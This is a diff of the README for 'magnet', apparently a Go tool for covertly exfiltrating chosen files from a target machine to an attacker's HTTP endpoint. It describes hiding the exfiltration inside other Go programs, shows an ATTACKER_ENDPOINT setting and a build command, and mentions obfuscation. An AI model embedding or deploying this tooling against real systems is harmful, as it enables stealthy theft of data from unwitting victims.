@@ -11,6 +11,8 @@
 
 The library is built to fetch predefined files of interest from a remote device. It assumes that an HTTP endpoint is listening when the program is launched.
 
+**Program execution on target will stealthy provide you the files you ask for.**
+
 You have 2 possibilities:
 * [Hide exfiltration in your program](#-inject-magnet-in-your-go-program)
 * [Use the standalone `magnet` executable](#-standalone)
@@ -30,8 +32,6 @@ export FILES=[FILENAME]
 export ENDPOINT[ATTACKER_ENDPOINT]
 export TARGET_OS=[TARGET_OS]
 ```
-
-Then, the program execution on target will stealthy provide you the files you ask for.
 
 ### 🥷 Inject `magnet` in your Go program
 
@@ -61,7 +61,7 @@ To build `magnet` binary in one step:
 ./build.sh $TARGET_OS $FILES $ENDPOINT $KEY
 ```
 
-See [`lobfuscator`](#build-lobfuscator)
+See [`lobfuscator`](#build-lobfuscator) and [full example](https://github.com/ariary/magnet/blob/main/examples/EXAMPLES.md)
 
 
 ### Obfuscation/Encryption
